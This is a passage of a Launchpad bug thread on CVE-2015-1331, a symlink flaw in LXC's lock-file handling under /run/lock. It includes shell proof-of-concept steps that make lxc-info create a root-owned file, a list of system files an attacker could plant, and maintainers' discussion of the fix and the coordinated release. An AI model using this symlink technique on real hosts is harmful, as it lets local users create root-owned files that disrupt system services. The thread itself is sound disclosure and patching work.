$ ls -al /run/lock/lxc/var/lib/lxc/
total 0
drwxrwxr-x 2 tyhicks tyhicks 60 Jul  2 10:21 .
drwxrwxr-x 3 tyhicks tyhicks 60 Jul  2 10:21 ..
lrwxrwxrwx 1 tyhicks tyhicks  5 Jul  2 10:21 somename -&gt; /test
$ sudo lxc-create --name somename --template download
...
Distribution: ubuntu
Release: trusty
Architecture: amd64
...
$ ls -al /run/lock/lxc/var/lib/lxc/
total 0
drwxrwxr-x 2 tyhicks tyhicks 60 Jul  2 10:21 .
drwxrwxr-x 3 tyhicks tyhicks 60 Jul  2 10:21 ..
lrwxrwxrwx 1 tyhicks tyhicks  5 Jul  2 10:21 somename -&gt; /test
$ cat /test
UNTRUNCATED
$ sudo lxc-info --name somename
Name:           somename
State:          STOPPED
$ ls -al /run/lock/lxc/var/lib/lxc/
total 0
drwxrwxr-x 2 tyhicks tyhicks 60 Jul  2 10:21 .
drwxrwxr-x 3 tyhicks tyhicks 60 Jul  2 10:21 ..
lrwxrwxrwx 1 tyhicks tyhicks  5 Jul  2 10:21 somename -&gt; /test
$ cat /test
UNTRUNCATED
</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/ubuntu/+source/lxc/+bug/1470842/comments/3" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~tyhicks" class="sprite person">Tyler Hicks (tyhicks)</a>
            wrote
            <time itemprop="commentTime" datetime="2015-07-02T15:30:34.907263+00:00" title="2015-07-02 15:30:34 UTC">on 2015-07-02</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/lxc/+bug/1470842/comments/3"> #3</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>The /test file is unmodified even after starting the container and running lxc-info.</p>
<p>Can you please update your PoC instructions? Thanks!</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">The /test file is unmodified even after starting the container and running lxc-info.

Can you please update your PoC instructions? Thanks!</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  <div class="boardCommentActivity">
    
      <table class="bug-activity">
  
    
      <tr>
        <td colspan="2">Changed in lxc (Ubuntu): </td>
      </tr>
    
    <tr>
      <td style="text-align: right;">
        <b>status</b>:
      </td>
      <td>
        New &#8594; Incomplete
      </td>
    </tr>
  
</table>
    
    
  </div>
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/ubuntu/+source/lxc/+bug/1470842/comments/4" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~tyhicks" class="sprite person">Tyler Hicks (tyhicks)</a>
            wrote
            <time itemprop="commentTime" datetime="2015-07-02T15:35:39.950871+00:00" title="2015-07-02 15:35:39 UTC">on 2015-07-02</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/lxc/+bug/1470842/comments/4"> #4</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Aha! Arbitrary file creation is possible, as you originally mentioned. Extending my previous examples:</p>
<p>$ sudo rm /test<br />
$ stat /test<br />
stat: cannot stat ‘/test’: No such file or directory<br />
$ sudo lxc-info --name somename<br />
Name:           somename<br />
State:          RUNNING<br />
PID:            1626<br />
IP:             10.0.3.198<br />
CPU use:        0.80 seconds<br />
BlkIO use:      196.00 KiB<br />
Memory use:     6.15 MiB<br />
KMem use:       0 bytes<br />
Link:           vethQCK98M<br />
&nbsp;TX bytes:      3.25 KiB<br />
&nbsp;RX bytes:      7.15 KiB<br />
&nbsp;Total bytes:   10.41 KiB<br />
$ stat /test<br />
&nbsp;&nbsp;File: ‘/test’<br />
&nbsp;&nbsp;Size: 0               Blocks: 0          IO Block: 4096   regular empty file<br />
Device: fd01h/64769d    Inode: 52559       Links: 1<br />
Access: (0600/-rw-------)  Uid: (    0/    root)   Gid: (    0/    root)<br />
Access: 2015-07-02 10:33:26.656442993 -0500<br />
Modify: 2015-07-02 10:33:26.656442993 -0500<br />
Change: 2015-07-02 10:33:26.656442993 -0500<br />
&nbsp;Birth: -</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Aha! Arbitrary file creation is possible, as you originally mentioned. Extending my previous examples:

$ sudo rm /test
$ stat /test
stat: cannot stat ‘/test’: No such file or directory
$ sudo lxc-info --name somename
Name:           somename
State:          RUNNING
PID:            1626
IP:             10.0.3.198
CPU use:        0.80 seconds
BlkIO use:      196.00 KiB
Memory use:     6.15 MiB
KMem use:       0 bytes
Link:           vethQCK98M
 TX bytes:      3.25 KiB
 RX bytes:      7.15 KiB
 Total bytes:   10.41 KiB
$ stat /test
  File: ‘/test’
  Size: 0               Blocks: 0          IO Block: 4096   regular empty file
Device: fd01h/64769d    Inode: 52559       Links: 1
Access: (0600/-rw-------)  Uid: (    0/    root)   Gid: (    0/    root)
Access: 2015-07-02 10:33:26.656442993 -0500
Modify: 2015-07-02 10:33:26.656442993 -0500
Change: 2015-07-02 10:33:26.656442993 -0500
 Birth: -
</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  <div class="boardCommentActivity">
    
      <table class="bug-activity">
  
    
      <tr>
        <td colspan="2">Changed in lxc (Ubuntu): </td>
      </tr>
    
    <tr>
      <td style="text-align: right;">
        <b>status</b>:
      </td>
      <td>
        Incomplete &#8594; Confirmed
      </td>
    </tr>
  
</table>
    
    
  </div>
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/ubuntu/+source/lxc/+bug/1470842/comments/5" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~tyhicks" class="sprite person">Tyler Hicks (tyhicks)</a>
            wrote
            <time itemprop="commentTime" datetime="2015-07-02T15:37:40.182823+00:00" title="2015-07-02 15:37:40 UTC">on 2015-07-02</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/lxc/+bug/1470842/comments/5"> #5</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Could you please re-verify that arbitrary file truncation is possible and update your PoC instructions? I can only reproduce the arbitrary file creation vulnerability.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Could you please re-verify that arbitrary file truncation is possible and update your PoC instructions? I can only reproduce the arbitrary file creation vulnerability.</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          

          
              <div class="boardComment">
  <div class="boardCommentDetails">
    
      <a href="https://launchpad.net/~tyhicks" class="sprite person">Tyler Hicks (tyhicks)</a>
    
    <time title="2015-07-02 15:46:07 UTC" datetime="2015-07-02T15:46:07.751633+00:00">on 2015-07-02</time>
  </div>
  <div class="boardCommentActivity">
    <table class="bug-activity">
  
    
      
    
    <tr>
      <td style="text-align: right;">
        <b>description</b>:
      </td>
      <td>
        updated
      </td>
    </tr>
  
</table>
  </div>
</div>
          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/ubuntu/+source/lxc/+bug/1470842/comments/6" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~mdeslaur" class="sprite person">Marc Deslauriers (mdeslaur)</a>
            wrote
            <time itemprop="commentTime" datetime="2015-07-02T15:50:45.424178+00:00" title="2015-07-02 15:50:45 UTC">on 2015-07-02</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/lxc/+bug/1470842/comments/6"> #6</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>This is CVE-2015-1331</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">This is CVE-2015-1331</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/ubuntu/+source/lxc/+bug/1470842/comments/7" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~roman-fiedler-deactivatedaccount" class="sprite person-inactive">Roman Fiedler (roman-fiedler-deactivatedaccount)</a>
            wrote
            <time itemprop="commentTime" datetime="2015-07-02T18:21:56.319171+00:00" title="2015-07-02 18:21:56 UTC">on 2015-07-02</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/lxc/+bug/1470842/comments/7"> #7</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>I failed also to reproduce now, so it seems I&#x27;ve made some mistake in interpretation of size output or mixed up something in the testcase. The lockfile create syscall is only O_RDWR|O_CREAT so no truncate flag here.</p>
<p>So only impact remains is creation of annoying files, e.g.</p>
<p>/etc/suid-debug<br />
/forcefsck<br />
/etc/ssh/<wbr />sshd_not_<wbr />to_be_run</p>
<p>and alike, making programs react strange if they find an directory where they expect a file or forcing process to get controlling TTY when not wanted.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">I failed also to reproduce now, so it seems I've made some mistake in interpretation of size output or mixed up something in the testcase. The lockfile create syscall is only O_RDWR|O_CREAT so no truncate flag here.

So only impact remains is creation of annoying files, e.g.

/etc/suid-debug
/forcefsck
/etc/ssh/sshd_not_to_be_run

and alike, making programs react strange if they find an directory where they expect a file or forcing process to get controlling TTY when not wanted.</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/ubuntu/+source/lxc/+bug/1470842/comments/8" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~tyhicks" class="sprite person">Tyler Hicks (tyhicks)</a>
            wrote
            <time itemprop="commentTime" datetime="2015-07-02T18:48:14.397276+00:00" title="2015-07-02 18:48:14 UTC">on 2015-07-02</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/lxc/+bug/1470842/comments/8"> #8</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Thanks for the confirmation. I&#x27;ll update the bug description accordingly.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Thanks for the confirmation. I'll update the bug description accordingly.</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  <div class="boardCommentActivity">
    
      <table class="bug-activity">
  
    
      
    
    <tr>
      <td style="text-align: right;">
        <b>description</b>:
      </td>
      <td>
        updated
      </td>
    </tr>
  
</table>
    
    
  </div>
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/ubuntu/+source/lxc/+bug/1470842/comments/9" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~stgraber" class="sprite person">Stéphane Graber (stgraber)</a>
            wrote
            <time itemprop="commentTime" datetime="2015-07-02T21:26:29.344056+00:00" title="2015-07-02 21:26:29 UTC">on 2015-07-02</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/lxc/+bug/1470842/comments/9"> #9</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>So it looks like most of this resulted from some entirely invalid assumption that /run/lock was root-writable only. Would just switching to /run/lxc instead fix the issue?</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">So it looks like most of this resulted from some entirely invalid assumption that /run/lock was root-writable only. Would just switching to /run/lxc instead fix the issue?</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/ubuntu/+source/lxc/+bug/1470842/comments/10" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~serge-hallyn" class="sprite person">Serge Hallyn (serge-hallyn)</a>
            wrote
            <time itemprop="commentTime" datetime="2015-07-02T22:17:24+00:00" title="2015-07-02 22:17:24 UTC">on 2015-07-02</time><span class="editable-message-last-edit-date">:
              </span>
              <a href="/ubuntu/+source/lxc/+bug/1470842/comments/10">
                <strong>Re: [Bug 1470842] Re: lxc tools lock handling vulnerable to symlink attack</strong>
              </a>
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/lxc/+bug/1470842/comments/10"> #10</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Quoting Stéphane Graber (&lt;email address hidden&gt;):<br />
<span class="foldable-quoted">
&gt; So it looks like most of this resulted from some entirely invalid<br />
&gt; assumption that /run/lock was root-writable only. Would just switching<br />
&gt; to /run/lxc instead fix the issue?
</span></p>
<p>That should work.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Quoting Stéphane Graber (stgraber@stgraber.org):
&gt; So it looks like most of this resulted from some entirely invalid
&gt; assumption that /run/lock was root-writable only. Would just switching
&gt; to /run/lxc instead fix the issue?

That should work.
</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/ubuntu/+source/lxc/+bug/1470842/comments/11" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~stgraber" class="sprite person">Stéphane Graber (stgraber)</a>
            wrote
            <time itemprop="commentTime" datetime="2015-07-06T19:12:31.126573+00:00" title="2015-07-06 19:12:31 UTC">on 2015-07-06</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/lxc/+bug/1470842/comments/11"> #11</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Serge provided a patch by e-mail.</p>
<p>Upstream we&#x27;ve got LXC 1.1.3 right around the corner so we can land the patch in git master and then push it to the 1.1 maintenance branch and tag 1.1.3 very soon after. This release will then make it directly to wily and vivid.</p>
<p>For trusty, we&#x27;ll have to wait for LXC 1.0.8 upstream and that&#x27;ll take a while longer as I&#x27;ve got a backlog of about 200 patches to go through for the stable branch.</p>
<p>So I guess the best for now is to pick a time where we:<br />
&nbsp;- Push Serge&#x27;s fix as a distro patch to all supported releases<br />
&nbsp;- Push the fix to LXC git master<br />
&nbsp;- Post to lxc-devel and lxc-users about the security issue<br />
&nbsp;- Tag LXC 1.1.3 including the fix<br />
&nbsp;- Continue working on LXC 1.0.8 which will include the fix too</p>
<p>We usually should be able to deal with shorter turnarounds for LXC stable releases, but recently the focus on LXD has made it hard to keep track of all the bugfixes and keep our stable branches in a releasable state. Thankfully I happened to fix that for 1.1 last week, but 1.0 will be a while longer.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Serge provided a patch by e-mail.

Upstream we've got LXC 1.1.3 right around the corner so we can land the patch in git master and then push it to the 1.1 maintenance branch and tag 1.1.3 very soon after. This release will then make it directly to wily and vivid.

For trusty, we'll have to wait for LXC 1.0.8 upstream and that'll take a while longer as I've got a backlog of about 200 patches to go through for the stable branch.

So I guess the best for now is to pick a time where we:
 - Push Serge's fix as a distro patch to all supported releases
 - Push the fix to LXC git master
 - Post to lxc-devel and lxc-users about the security issue
 - Tag LXC 1.1.3 including the fix
 - Continue working on LXC 1.0.8 which will include the fix too


We usually should be able to deal with shorter turnarounds for LXC stable releases, but recently the focus on LXD has made it hard to keep track of all the bugfixes and keep our stable branches in a releasable state. Thankfully I happened to fix that for 1.1 last week, but 1.0 will be a while longer.</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/ubuntu/+source/lxc/+bug/1470842/comments/12" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~tyhicks" class="sprite person">Tyler Hicks (tyhicks)</a>
            wrote
            <time itemprop="commentTime" datetime="2015-07-06T21:37:38+00:00" title="2015-07-06 21:37:38 UTC">on 2015-07-06</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/lxc/+bug/1470842/comments/12"> #12</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>On 2015-07-06 19:12:31, Stéphane Graber wrote:<br />
<span class="foldable-quoted">
&gt; Serge provided a patch by e-mail.
</span></p>
<p>I replied to his patch with a potential attack vector that was still<br />
available. I point this out because we may not have a final patch at<br />
this point.</p>
<p><span class="foldable-quoted">&gt; Upstream we&#x27;ve got LXC 1.1.3 right around the corner so we can land the<br />
&gt; patch in git master and then push it to the 1.1 maintenance branch and<br />
&gt; tag 1.1.3 very soon after. This release will then make it directly to<br />
&gt; wily and vivid.<br />
&gt;<br />
&gt; For trusty, we&#x27;ll have to wait for LXC 1.0.8 upstream and that&#x27;ll take a<br />
&gt; while longer as I&#x27;ve got a backlog of about 200 patches to go through<br />
&gt; for the stable branch.
</span></p>
<p>The security team will apply the fix, as a distro patch, to all affected<br />
stable releases and push out updates. You can then handle the Trusty SRU<br />
however you&#x27;d like as long as you don&#x27;t drop the fix in the version that<br />
you take through the SRU process.</p>
<p><span class="foldable-quoted">&gt; So I guess the best for now is to pick a time where we:<br />
&gt;  - Push Serge&#x27;s fix as a distro patch to all supported releases<br />
&gt;  - Push the fix to LXC git master<br />
&gt;  - Post to lxc-devel and lxc-users about the security issue<br />
&gt;  - Tag LXC 1.1.3 including the fix<br />
&gt;  - Continue working on LXC 1.0.8 which will include the fix too
</span></p>
<p>Lets wait just a little bit longer on deciding that time until we&#x27;re<br />
sure that we have a final patch available.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">On 2015-07-06 19:12:31, Stéphane Graber wrote:
&gt; Serge provided a patch by e-mail.

I replied to his patch with a potential attack vector that was still
available. I point this out because we may not have a final patch at
this point.

&gt; Upstream we've got LXC 1.1.3 right around the corner so we can land the
&gt; patch in git master and then push it to the 1.1 maintenance branch and
&gt; tag 1.1.3 very soon after. This release will then make it directly to
&gt; wily and vivid.
&gt; 
&gt; For trusty, we'll have to wait for LXC 1.0.8 upstream and that'll take a
&gt; while longer as I've got a backlog of about 200 patches to go through
&gt; for the stable branch.

The security team will apply the fix, as a distro patch, to all affected
stable releases and push out updates. You can then handle the Trusty SRU
however you'd like as long as you don't drop the fix in the version that
you take through the SRU process.

&gt; So I guess the best for now is to pick a time where we:
&gt;  - Push Serge's fix as a distro patch to all supported releases
&gt;  - Push the fix to LXC git master
&gt;  - Post to lxc-devel and lxc-users about the security issue
&gt;  - Tag LXC 1.1.3 including the fix
&gt;  - Continue working on LXC 1.0.8 which will include the fix too

Lets wait just a little bit longer on deciding that time until we're
sure that we have a final patch available.
</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/ubuntu/+source/lxc/+bug/1470842/comments/13" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~tyhicks" class="sprite person">Tyler Hicks (tyhicks)</a>
            wrote
            <time itemprop="commentTime" datetime="2015-07-15T15:58:34.881605+00:00" title="2015-07-15 15:58:34 UTC">on 2015-07-15</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/lxc/+bug/1470842/comments/13"> #13</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    <ul style="margin-bottom: 1em">
      <li class="download-attachment">
